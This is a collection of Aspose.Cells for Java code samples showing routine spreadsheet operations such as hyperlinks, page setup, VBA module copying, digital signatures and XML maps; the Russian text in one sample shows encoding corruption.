Workbook workbook = new Workbook(sourceDir + ""HyperlinksSample.xlsx"");


// Get the first (default) worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Create a range A2:B3
Range range = worksheet.getCells().createRange(""A2"", ""B3"");


// Get Hyperlinks in range
Hyperlink[] hyperlinks = range.getHyperlinks();


for (Hyperlink link : hyperlinks){
 System.out.println(link.getArea() + "" : "" + link.getAddress());


 // To delete the link, use the Hyperlink.Delete() method.
 link.delete();
}


workbook.save(outputDir + ""HyperlinksSample_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String sourceDir = Utils.Get_SourceDirectory();


Workbook workbook = new Workbook(sourceDir + ""ODataSample.xlsx"");
PowerQueryFormulaCollction PQFcoll = workbook.getDataMashup().getPowerQueryFormulas();
for (Object obj : PQFcoll)
{
 PowerQueryFormula PQF = (PowerQueryFormula)obj;
 System.out.println(""Connection Name: "" + PQF.getName());
 PowerQueryFormulaItemCollection PQFIcoll = PQF.getPowerQueryFormulaItems();
 for (Object obj2 : PQFIcoll)
    {
 PowerQueryFormulaItem PQFI = (PowerQueryFormulaItem)obj2;
 System.out.println(""Name: "" + PQFI.getName());
 System.out.println(""Value: "" + PQFI.getValue());
    }
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Instantiate a Workbook object and Open an Excel file
Workbook workbook = new Workbook(sourceDir + ""SampleExternalReferences.xlsx"");
Name namedRange = workbook.getWorksheets().getNames().get(""Names"");
 
// Get ReferredAreas
ReferredArea[] referredAreas = namedRange.getReferredAreas(true);
 
if (referredAreas != null) {
 for (int i = 0; i < referredAreas.length; i++) {
 ReferredArea referredArea = referredAreas[i];
 // Print the data in Referred Area
 System.out.println(""IsExternalLink: "" + referredArea.isExternalLink());
 System.out.println(""IsArea: "" + referredArea.isArea());
 System.out.println(""SheetName: "" + referredArea.getSheetName());
 System.out.println(""ExternalFileName: "" + referredArea.getExternalFileName());
 System.out.println(""StartColumn: "" + referredArea.getStartColumn());
 System.out.println(""StartRow: "" + referredArea.getStartRow());
 System.out.println(""EndColumn: "" + referredArea.getEndColumn());
 System.out.println(""EndRow: "" + referredArea.getEndRow());
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create empty Excel file
Workbook wb = new Workbook();


//Protect the Shared Workbook with Password
wb.protectSharedWorkbook(""1234"");


//Uncomment this line to Unprotect the Shared Workbook
//wb.unprotectSharedWorkbook(""1234"");


//Save the output Excel file
wb.save(""outputProtectSharedWorkbook.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String sourceDir = Utils.Get_SourceDirectory();


Workbook workbook = new Workbook(sourceDir + ""Book1.xlsx"");
ImageOrPrintOptions imgOptions = new ImageOrPrintOptions();
WorkbookPrintingPreview preview = new WorkbookPrintingPreview(workbook, imgOptions);
System.out.println(""Workbook page count: "" + preview.getEvaluatedPageCount());


SheetPrintingPreview preview2 = new SheetPrintingPreview(workbook.getWorksheets().get(0), imgOptions );
System.out.println(""Worksheet page count: "" + preview2.getEvaluatedPageCount());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the source Excel Xlsb file
Workbook wb = new Workbook(""sampleExternalConnection_XLSB.xlsb"");
 
//Read the first external connection which is actually a DB-Connection
DBConnection dbCon = (DBConnection)wb.getDataConnections().get(0);
 
//Print the Name, Command and Connection Info of the DB-Connection
System.out.println(""Connection Name: "" + dbCon.getName());
System.out.println(""Command: "" + dbCon.getCommand());
System.out.println(""Connection Info: "" + dbCon.getConnectionInfo());
 
//Modify the Connection Name
dbCon.setName(""NewCust"");
 
//Save the Excel Xlsb file
wb.save(""outputExternalConnection_XLSB.xlsb"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// directories
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""SampleRegexReplace.xlsx"");


ReplaceOptions replace = new ReplaceOptions();
replace.setCaseSensitive(false);
replace.setMatchEntireCellContents(false);
// Set to true to indicate that the searched key is regex
replace.setRegexKey(true);


workbook.replace(""\\bKIM\\b"", ""^^^TIM^^^"", replace);
workbook.save(outputDir + ""RegexReplace_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public class StopConversionOrLoadingUsingInterruptMonitor
{
 static String outDir = Utils.Get_OutputDirectory();
 //Create InterruptMonitor object
 InterruptMonitor im = new InterruptMonitor();


 public class ConversionThread extends Thread
    {
 private Thread monitorThread;


 public ConversionThread(Thread monitorThread)
        {
 this.monitorThread = monitorThread;
        }


 //This function will create workbook and convert it to Pdf format
 void createWorkbookAndConvertItToPdfFormat() throws Exception
        {
 //Create a workbook object
 Workbook wb = new Workbook();


 //Assign it InterruptMonitor object
 wb.setInterruptMonitor(im);


 //Access first worksheet
 Worksheet ws = wb.getWorksheets().get(0);


 //Access cell AB1000000 and add some text inside it.
 Cell cell = ws.getCells().get(""AB1000000"");
 cell.putValue(""This is text."");


 try
            {
 //Save the workbook to Pdf format
 wb.save(outDir + ""output_InterruptMonitor.pdf"");


 //Show successful message
 System.out.println(""Excel to PDF - Successful Conversion"");


 //stop monitor thread
 monitorThread.interrupt();
            }
 catch (CellsException ex)
            {
 if(ex.getCode() == ExceptionType.INTERRUPTED)
                {
 System.out.println(""Conversion process is interrupted - Message: "" + ex.getMessage());
                }
 else
                {
 throw ex;
                }
            }
        }


 public void run()
        {
 try
            {
 createWorkbookAndConvertItToPdfFormat();
            }
 catch(Exception ex)
            {
 System.out.println(""Conversion thread error - Message: "" + ex.getMessage());
            }


        }
    }//ConversionThread




 public class MonitorThread extends Thread
    {
 //This function will interrupt the conversion process after 10s
 void waitForWhileAndThenInterrupt() throws Exception
        {
 Thread.sleep(1000 * 10);
 im.interrupt();
        }


 public void run()
        {
 try 
            {
 waitForWhileAndThenInterrupt();
            } 
 catch (InterruptedException ex) 
            {
 System.out.println(""Monitor thread is interrupted - Message: "" + ex.getMessage());
            } 
 catch (Exception ex) 
            {
 System.out.println(""Monitor thread error - Message: "" + ex.getMessage());
            }
        }
    }//MonitorThread


 public void testRun() throws Exception
    {
 MonitorThread monitorThread = new MonitorThread();
 ConversionThread conversionThread = new ConversionThread(monitorThread);


 monitorThread.start();
 conversionThread.start();


 monitorThread.join();
 conversionThread.join();
    }


 public static void main(String[] args) throws Exception 
    {


 new StopConversionOrLoadingUsingInterruptMonitor().testRun();


 // Print the message
 System.out.println(""StopConversionOrLoadingUsingInterruptMonitor executed successfully."");


    }


}//StopConversionOrLoadingUsingInterruptMonitor
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(FileFormatType.XLSX);
int index = workbook.getContentTypeProperties().add(""MK31"", ""Simple Data"");
workbook.getContentTypeProperties().get(index).setNillable(false);
index= workbook.getContentTypeProperties().add(""MK32"", ""2019-10-17T16:00:00+00:00"", ""DateTime"");
workbook.getContentTypeProperties().get(index).setNillable(false);
workbook.save(outputDir + ""WorkingWithContentTypeProperties_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// directories
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""sourceFile.xlsx"");
String password = ""pfxPassword"";
String pfx = ""pfxFile"";


// Load the certificate into an instance of InputStream
InputStream inStream = new FileInputStream(pfx);


// Create an instance of KeyStore with PKCS12 cryptography
java.security.KeyStore inputKeyStore = java.security.KeyStore.getInstance(""PKCS12"");


// Use the KeyStore.load method to load the certificate stream and its password
inputKeyStore.load(inStream, password.toCharArray());


DigitalSignature signature = new DigitalSignature(inputKeyStore, password, ""testXAdES"", com.aspose.cells.DateTime.getNow());


signature.setXAdESType(XAdESType.X_AD_ES);
DigitalSignatureCollection dsCollection = new DigitalSignatureCollection();
dsCollection.add(signature);


workbook.setDigitalSignature(dsCollection);


workbook.save(outputDir + ""XAdESSignatureSupport_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Implementation of IStreamProvider
class SP implements IStreamProvider
{
 public void closeStream(StreamProviderOptions arg0) throws Exception {
	}


 public void initStream(StreamProviderOptions options) throws Exception {


 //Open the filestream of Aspose Logo and assign it to StreamProviderOptions.Stream property
 File imgFile = new File(srcDir + ""sampleControlExternalResourcesUsingWorkbookSetting_StreamProvider.png"");


 byte[] bts = new byte[(int) imgFile.length()];


 FileInputStream fin = new FileInputStream(imgFile);
 fin.read(bts);
 fin.close();


 ByteArrayOutputStream baout = new ByteArrayOutputStream();
 baout.write(bts);
 baout.close();
 
 options.setStream(baout);
	}
}




public void Run() throws Exception {
 System.out.println(""Aspose.Cells for Java Version: "" + CellsHelper.getVersion());


 //String srcDir = Utils.Get_SourceDirectory();
 //String outDir = Utils.Get_OutputDirectory();


 //Load sample Excel file containing the external resource e.g. linked image etc.
 Workbook wb = new Workbook(srcDir + ""sampleControlExternalResourcesUsingWorkbookSetting_StreamProvider.xlsx"");


 //Provide your implementation of IStreamProvider
 wb.getSettings().setStreamProvider(new SP());


 //Access first worksheet
 Worksheet ws = wb.getWorksheets().get(0);


 //Specify image or print options, we need one page per sheet and png output
 ImageOrPrintOptions opts = new ImageOrPrintOptions();
 opts.setOnePagePerSheet(true);
 opts.setImageType(ImageType.PNG);


 //Create sheet render by passing required parameters
 SheetRender sr = new SheetRender(ws, opts);


 //Convert your entire worksheet into png image
 sr.toImage(0, outDir + ""outputControlExternalResourcesUsingWorkbookSettingStreamProvider.png"");


 // Print the message
 System.out.println(""ControlExternalResourcesUsingWorkbookSetting_StreamProvider executed successfully."");
}


public static void main(String[] args) throws Exception {
 new ControlExternalResourcesUsingWorkbookSetting_StreamProvider().Run();
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


public class ImplementErrorsAndBooleanValueInRussianOrAnyOtherLanguage { 


 // Russian Globalization
 class RussianGlobalization extends GlobalizationSettings {
 public String getErrorValueString(String err) {
 switch (err.toUpperCase()) {
 case ""#NAME?"":
 return ""#RussianName-�ڬެ�?"";


			}


 return ""RussianError-���ڬҬܬ�"";
		}


 public String getBooleanValueString(Boolean bv) {
 return bv ? ""RussianTrue-���ѬӬլ�"" : ""RussianFalse-�ݬ�ج߬���"";
		}
	}


 public void Run() throws Exception {
 System.out.println(""Aspose.Cells for Java Version: "" + CellsHelper.getVersion());


 String srcDir = Utils.Get_SourceDirectory();
 String outDir = Utils.Get_OutputDirectory();


 // Load the source workbook
 Workbook wb = new Workbook(srcDir + ""sampleRussianGlobalization.xlsx"");


 // Set GlobalizationSettings in Russian Language
 wb.getSettings().setGlobalizationSettings(new RussianGlobalization());


 // Calculate the formula
 wb.calculateFormula();


 // Save the workbook in pdf format
 wb.save(outDir + ""outputRussianGlobalization.pdf"");
	}


 public static void main(String[] args) throws Exception {


 ImplementErrorsAndBooleanValueInRussianOrAnyOtherLanguage impErr = new ImplementErrorsAndBooleanValueInRussianOrAnyOtherLanguage();
 impErr.Run();
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Define variables
String name = ""HasFormula"";
String value = ""=GET.CELL(48, INDIRECT(\""ZS\"",FALSE))"";


// Load the template file
Workbook wbSource = new Workbook(srcDir + ""sampleNamedRangeTest.xlsm"");
 
// Get the worksheets collection
WorksheetCollection wsCol = wbSource.getWorksheets();


// Add new name to the names collection
int nameIndex = wsCol.getNames().add(name);
 
// Set value to the named range
Name namedRange = wsCol.getNames().get(nameIndex);
namedRange.setRefersTo(value);


// Save the output file
wbSource.save(outDir + ""sampleOutputNamedRangeTest.xlsm"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create empty target workbook
Workbook target = new Workbook();
 
//Load the Excel file containing VBA-Macro Designer User Form
Workbook templateFile = new Workbook(srcDir + ""sampleDesignerForm.xlsm"");
 
//Copy all template worksheets to target workboook
int sheetCount = templateFile.getWorksheets().getCount();


for(int idx=0; idx<sheetCount; idx++)
{
 Worksheet ws = templateFile.getWorksheets().get(idx);
 
 if (ws.getType() == SheetType.WORKSHEET)
	{
 Worksheet s = target.getWorksheets().add(ws.getName());
 s.copy(ws);
 
 //Put message in cell A2 of the target worksheet
 s.getCells().get(""A2"").putValue(""VBA Macro and User Form copied from template to target."");
	}
}//for
 
//-----------------------------------------------
 
//Copy the VBA-Macro Designer UserForm from Template to Target
int modCount = templateFile.getWorksheets().getCount();


for(int idx=0; idx<modCount; idx++)
{
 VbaModule vbaItem = templateFile.getVbaProject().getModules().get(idx);
 
 if (vbaItem.getName().equals(""ThisWorkbook""))
	{
 //Copy ThisWorkbook module code
 target.getVbaProject().getModules().get(""ThisWorkbook"").setCodes(vbaItem.getCodes());
	}
 else
	{
 //Copy other modules code and data
 System.out.println(vbaItem.getName());
 
 int vbaMod = 0;
 Worksheet sheet = target.getWorksheets().getSheetByCodeName(vbaItem.getName());
 if (sheet == null)
		{
 vbaMod = target.getVbaProject().getModules().add(vbaItem.getType(), vbaItem.getName());
		}
 else
		{
 vbaMod = target.getVbaProject().getModules().add(sheet);
		}
 
 target.getVbaProject().getModules().get(vbaMod).setCodes(vbaItem.getCodes());
 
 if ((vbaItem.getType() == VbaModuleType.DESIGNER))
		{
 //Get the data of the user form i.e. designer storage
 byte[] designerStorage = templateFile.getVbaProject().getModules().getDesignerStorage(vbaItem.getName());
 
 //Add the designer storage to target Vba Project
 target.getVbaProject().getModules().addDesignerStorage(vbaItem.getName(), designerStorage);
		}
	}//else
}//for
 
//Save the target workbook
target.save(outDir + ""outputDesignerForm.xlsm"", SaveFormat.XLSM);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CountNumberOfCells.class) + ""Worksheets/"";
//Load source Excel file
Workbook workbook = new Workbook(dataDir + ""BookWithSomeData.xlsx"");


//Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


//Print number of cells in the Worksheet
System.out.println(""Number of Cells: "" + worksheet.getCells().getCount());


// If the number of cells is greater than 2147483647, use CountLarge
System.out.println(""Number of Cells (CountLarge): "" + worksheet.getCells().getCountLarge());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(CountNumberOfCells.class) + ""Worksheets/"";
// Instantiating a Workbook object
Workbook workbook = new Workbook();
Worksheet worksheet = workbook.getWorksheets().get(0);


worksheet.getCells().get(0, 2).setValue(1);
worksheet.getCells().get(1, 2).setValue(2);
worksheet.getCells().get(2, 2).setValue(3);
worksheet.getCells().get(2, 3).setValue(4);
worksheet.getCells().createRange(0, 2, 3, 1).setName(""NamedRange"");


Range cut = worksheet.getCells().createRange(""C:C"");
worksheet.getCells().insertCutCells(cut, 0, 1, ShiftType.RIGHT);
workbook.save(dataDir + ""CutAndPasteCells.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//directories
String sourceDir = Utils.Get_SourceDirectory();


// Instantiating a Workbook object
Workbook workbook = new Workbook(sourceDir + ""SampleBook1.ods"");


// Add a page break at cell Y30
WorksheetCollection worksheets = workbook.getWorksheets();
Worksheet worksheet = worksheets.get(0);


Cell cell = worksheet.getCells().get(""A9"");


if(cell.getValidation() != null)
{
 System.out.println(cell.getValidation().getType());
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String sourceDir = Utils.Get_SourceDirectory();


// Load source Excel file
Workbook workbook = new Workbook(sourceDir + ""Book1.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Print Unique Id
System.out.println(""Unique Id: "" + worksheet.getUniqueId());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Converting integer enums to string enums
HashMap<Integer, String> paperSizeTypes = new HashMap<Integer, String>();
paperSizeTypes.put(PaperSizeType.PAPER_A_3_EXTRA_TRANSVERSE, ""PAPER_A_3_EXTRA_TRANSVERSE"");
paperSizeTypes.put(PaperSizeType.PAPER_LETTER, ""PAPER_LETTER"");
 
//Create workbook
Workbook wb = new Workbook();
 
//Add two test worksheets
wb.getWorksheets().add(""TestSheet1"");
wb.getWorksheets().add(""TestSheet2"");
 
//Access both worksheets as TestSheet1 and TestSheet2
Worksheet TestSheet1 = wb.getWorksheets().get(""TestSheet1"");
Worksheet TestSheet2 = wb.getWorksheets().get(""TestSheet2"");
 
//Set the Paper Size of TestSheet1 to PaperA3ExtraTransverse
TestSheet1.getPageSetup().setPaperSize(PaperSizeType.PAPER_A_3_EXTRA_TRANSVERSE);
 
//Print the Paper Size of both worksheets
System.out.println(""Before Paper Size: "" + paperSizeTypes.get(TestSheet1.getPageSetup().getPaperSize()));
System.out.println(""Before Paper Size: "" + paperSizeTypes.get(TestSheet2.getPageSetup().getPaperSize()));
System.out.println();
 
//Copy the PageSetup from TestSheet1 to TestSheet2
TestSheet2.getPageSetup().copy(TestSheet1.getPageSetup(), new CopyOptions());
 
//Print the Paper Size of both worksheets
System.out.println(""After Paper Size: "" + paperSizeTypes.get(TestSheet1.getPageSetup().getPaperSize()));
System.out.println(""After Paper Size: "" + paperSizeTypes.get(TestSheet2.getPageSetup().getPaperSize()));
System.out.println();
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load the first workbook having automatic paper size false
Workbook wb1 = new Workbook(srcDir + ""samplePageSetupIsAutomaticPaperSize-False.xlsx"");


// Load the second workbook having automatic paper size true
Workbook wb2 = new Workbook(srcDir + ""samplePageSetupIsAutomaticPaperSize-True.xlsx"");


// Access first worksheet of both workbooks
Worksheet ws11 = wb1.getWorksheets().get(0);
Worksheet ws12 = wb2.getWorksheets().get(0);


// Print the PageSetup.IsAutomaticPaperSize property of both worksheets
System.out.println(""First Worksheet of First Workbook - IsAutomaticPaperSize: "" + ws11.getPageSetup().isAutomaticPaperSize());
System.out.println(""First Worksheet of Second Workbook - IsAutomaticPaperSize: "" + ws12.getPageSetup().isAutomaticPaperSize());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create workbook object
Workbook wb = new Workbook();
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Set custom paper size in unit of inches
ws.getPageSetup().customPaperSize(6, 4);
 
//Access cell B4
Cell b4 = ws.getCells().get(""B4"");
 
//Add the message in cell B4
b4.putValue(""Pdf Page Dimensions: 6.00 x 4.00 in"");
 
//Save the workbook in pdf format
wb.save(outDir + ""outputCustomPaperSize.pdf"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file
Workbook wb = new Workbook(srcDir + ""sampleRemoveExistingPrinterSettingsOfWorksheets.xlsx"");
 
//Get the sheet counts of the workbook
int sheetCount = wb.getWorksheets().getCount();
 
//Iterate all sheets
for(int i=0; i<sheetCount; i++)
{
 //Access the i-th worksheet
 Worksheet ws = wb.getWorksheets().get(i);
 
 //Access worksheet page setup
 PageSetup ps = ws.getPageSetup();
 
 //Check if printer settings for this worksheet exist
 if(ps.getPrinterSettings() != null)
	{
 //Print the following message
 System.out.println(""PrinterSettings of this worksheet exist."");
 
 //Print sheet name and its paper size
 System.out.println(""Sheet Name: "" + ws.getName());
 System.out.println(""Paper Size: "" + ps.getPaperSize());
 
 //Remove the printer settings by setting them null
 ps.setPrinterSettings(null);
 System.out.println(""Printer settings of this worksheet are now removed by setting it null."");
 System.out.println("""");
	}//if
}//for
 
//Save the workbook
wb.save(outDir + ""outputRemoveExistingPrinterSettingsOfWorksheets.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public static void main(String[] args) throws Exception {
 // The path to the source directory.
 String sourceDir = Utils.Get_SourceDirectory();
 // The path to the output directory.
 String outDir = Utils.Get_OutputDirectory();


 //Load source Excel file
 Workbook workbook = new Workbook(sourceDir + ""GraphicBackground.ods"");


 //Access first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 OdsPageBackground background = worksheet.getPageSetup().getODSPageBackground();


 System.out.println(""Background Type: "" + getTypeValue(background.getType()));
 System.out.println(""Backgorund Position: "" + getPositionValue(background.getGraphicPositionType()));


 //Save background image
 
 ByteArrayInputStream stream = new ByteArrayInputStream(background.getGraphicData());
 BufferedImage image = ImageIO.read(stream);
 ImageIO.write(image, ""png"", new File(outDir + ""background.png""));


 System.out.println(""ReadODSBackground executed successfully."");        
}
 
public static String getTypeValue(int type) {
 String value = """";
 if(type == OdsPageBackgroundType.COLOR) {
 value = ""COLOR"";
	} else if(type == OdsPageBackgroundType.GRAPHIC) {
 value = ""GRAPHIC"";
	} else if(type == OdsPageBackgroundType.NONE) {
 value = ""NONE"";
	}
 return value;
}
 
public static String getPositionValue(int position) {
 String value = """";
 if(position == OdsPageBackgroundGraphicPositionType.BOTTOM_CENTER) {
 value = ""BOTTOM_CENTER"";
	} else if(position == OdsPageBackgroundGraphicPositionType.BOTTOM_LEFT) {
 value = ""BOTTOM_LEFT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.BOTTOM_RIGHT) {
 value = ""BOTTOM_RIGHT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.CENTER_CENTER) {
 value = ""CENTER_CENTER"";
	} else if(position == OdsPageBackgroundGraphicPositionType.CENTER_LEFT) {
 value = ""CENTER_LEFT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.CENTER_RIGHT) {
 value = ""CENTER_RIGHT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.TOP_CENTER) {
 value = ""TOP_CENTER"";
	} else if(position == OdsPageBackgroundGraphicPositionType.TOP_LEFT) {
 value = ""TOP_LEFT"";
	} else if(position == OdsPageBackgroundGraphicPositionType.TOP_RIGHT) {
 value = ""TOP_RIGHT"";
	}
 return value;
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String outDir = Utils.Get_OutputDirectory();
 
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 //Access first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 worksheet.getCells().get(0, 0).setValue(1);
 worksheet.getCells().get(1, 0).setValue(2);
 worksheet.getCells().get(2, 0).setValue(3);
 worksheet.getCells().get(3, 0).setValue(4);
 worksheet.getCells().get(4, 0).setValue(5);
 worksheet.getCells().get(5, 0).setValue(6);
 worksheet.getCells().get(0, 1).setValue(7);
 worksheet.getCells().get(1, 1).setValue(8);
 worksheet.getCells().get(2, 1).setValue(9);
 worksheet.getCells().get(3, 1).setValue(10);
 worksheet.getCells().get(4, 1).setValue(11);
 worksheet.getCells().get(5, 1).setValue(12);


 OdsPageBackground background = worksheet.getPageSetup().getODSPageBackground();


 background.setColor(Color.getAzure());
 background.setType(OdsPageBackgroundType.COLOR);


 workbook.save(outDir + ""ColoredBackground.ods"", SaveFormat.ODS);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();
// The path to the output directory.
String outDir = Utils.Get_OutputDirectory();
 
// Instantiating a Workbook object
 Workbook workbook = new Workbook();


 //Access first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 worksheet.getCells().get(0, 0).setValue(1);
 worksheet.getCells().get(1, 0).setValue(2);
 worksheet.getCells().get(2, 0).setValue(3);
 worksheet.getCells().get(3, 0).setValue(4);
 worksheet.getCells().get(4, 0).setValue(5);
 worksheet.getCells().get(5, 0).setValue(6);
 worksheet.getCells().get(0, 1).setValue(7);
 worksheet.getCells().get(1, 1).setValue(8);
 worksheet.getCells().get(2, 1).setValue(9);
 worksheet.getCells().get(3, 1).setValue(10);
 worksheet.getCells().get(4, 1).setValue(11);
 worksheet.getCells().get(5, 1).setValue(12);


 OdsPageBackground background = worksheet.getPageSetup().getODSPageBackground();
 
 BufferedImage image = ImageIO.read(new File(sourceDir + ""background.png""));
 ByteArrayOutputStream bos = new ByteArrayOutputStream();
 ImageIO.write(image, ""png"", bos );
 byte [] imageData = bos.toByteArray();


 background.setType(OdsPageBackgroundType.GRAPHIC);
 background.setGraphicData(imageData);
 background.setGraphicType(OdsPageBackgroundGraphicType.AREA);


 workbook.save(outDir + ""GraphicBackground.ods"", SaveFormat.ODS);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file
Workbook wb = new Workbook(""sampleSheetId.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Print its Sheet or Tab Id on console
System.out.println(""Sheet or Tab Id: "" + ws.getTabId());
 
//Change Sheet or Tab Id
ws.setTabId(358);
 
//Save the workbook
wb.save(""outputSheetId.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load sample Excel file having Xml Map
Workbook wb = new Workbook(""sampleRootElementNameOfXmlMap.xlsx"");
 
//Access first Xml Map inside the Workbook
XmlMap xmap = wb.getWorksheets().getXmlMaps().get(0);
 
//Print Root Element Name of Xml Map on Console
System.out.println(""Root Element Name Of Xml Map: "" + xmap.getRootElementName());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
// Load XLSX file containing data from XML file
Workbook workbook = new Workbook(""XML Data.xlsx"");


// Access the first worksheet
Worksheet ws = workbook.getWorksheets().get(0);


// Access ListObject from the first sheet
ListObject listObject = ws.getListObjects().get(0);


// Get the url of the list object's xml map data binding
String url = listObject.getXmlMap().getDataBinding().getUrl();


// Display XML file name
System.out.println(url);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
//Load sample Excel file having Xml Map
Workbook wb = new Workbook(""sampleXmlMapQuery.xlsx"");
 
//Access first XML Map
XmlMap xmap = wb.getWorksheets().getXmlMaps().get(0);
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Query Xml Map from Path - /MiscData
System.out.println(""Query Xml Map from Path - /MiscData"");
ArrayList ret = ws.xmlMapQuery(""/MiscData"", xmap);
 
//Print returned ArrayList values
for (int i = 0; i < ret.size(); i++)
{
 System.out.println(ret.get(i));
}
 
System.out.println("""");
 
//Query Xml Map from Path - /MiscData/row/Color
System.out.println(""Query Xml Map from Path - /MiscData/row/Color"");
ret = ws.xmlMapQuery(""/MiscData/row/Color"", xmap);
 
//Print returned ArrayList values
for (int i = 0; i < ret.size(); i++)
{
 System.out.println(ret.get(i));
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AccessAndUpdatePortions.class);


Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


Worksheet worksheet = workbook.getWorksheets().get(0);


Cell cell = worksheet.getCells().get(""A1"");


System.out.println(""Before updating the font settings...."");


FontSetting[] fnts = cell.getCharacters();


for (int i = 0; i < fnts.length; i++) {
 System.out.println(fnts[i].getFont().getName());
}


// Modify the first FontSetting Font Name
fnts[0].getFont().setName(""Arial"");


// And update it using SetCharacters() method
cell.setCharacters(fnts);


System.out.println();


System.out.println(""After updating the font settings...."");


fnts = cell.getCharacters();


for (int i = 0; i < fnts.length; i++) {
 System.out.println(fnts[i].getFont().getName());
}


// Save workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AccessingTablefromCell.class);
// Create workbook from source Excel file
Workbook workbook = new Workbook(dataDir + ""source.xlsx"");


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access cell D5 which lies inside the table
Cell cell = worksheet.getCells().get(""D5"");


// Put value inside the cell D5
cell.putValue(""D5 Data"");


// Access the Table from this cell
ListObject table = cell.getTable();


// Add some value using Row and Column Offset
table.putCellValue(2, 2, ""Offset [2,2]"");


// Save the workbook
workbook.save(dataDir + ""output.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(AccessTextBoxName.class);


Workbook workbook = new Workbook();


Worksheet sheet = workbook.getWorksheets().get(0);


int idx = sheet.getTextBoxes().add(10, 10, 10, 10);


// Create a texbox with some text and assign it some name
TextBox tb1 = sheet.getTextBoxes().get(idx);
tb1.setName(""MyTextBox"");
tb1.setText(""This is MyTextBox"");


// Access the same textbox via its name
TextBox tb2 = sheet.getTextBoxes().get(""MyTextBox"");


// Displaying the text of the textbox accessed by its name
System.out.println(tb2.getText());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getDataDir(ActivatingSheetsandActivatingCell.class);
// Instantiate a new Workbook
Workbook workbook = new Workbook();
// Get the first worksheet in the workbook
Worksheet worksheet = workbook.getWorksheets().get(0);
// Get the cells in the worksheet
Cells cells = worksheet.getCells();
// Input data into B2 cell
cells.get(1, 1).putValue(""Hello World!"");
// Set the first sheet as an active sheet
workbook.getWorksheets().setActiveSheetIndex(0);
// Set B2 cell as an active cell in the worksheet
worksheet.setActiveCell(""B2"");
// Set the B column as the first visible column in the worksheet
worksheet.setFirstVisibleColumn(1);
// Set the 2nd row as the first visible row in the worksheet
worksheet.setFirstVisibleRow(1);
// Save the excel file
workbook.save(dataDir + ""activecell.xls"");
